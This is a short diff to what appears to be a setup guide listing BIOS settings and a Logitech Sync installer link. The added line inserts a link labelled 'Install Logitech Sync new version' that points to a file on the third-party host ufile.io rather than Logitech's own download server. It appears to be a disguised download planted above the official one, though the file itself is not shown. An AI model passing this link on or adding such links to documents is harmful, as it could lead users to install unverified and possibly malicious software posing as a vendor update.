@@ -47,7 +47,7 @@ Wakeup Second"59"
 PCIe ASPM Support "unCheck the mark"
 The reset of the field should be set to default.
 ```
-
+[Install Logitech Sync new version](https://ufile.io/pkldq4a3)
 
 [Install Logitech Sync](https://download01.logi.com/web/ftp/pub/techsupport/cameras/LogiSyncInstaller_2.0.412.exe)
 
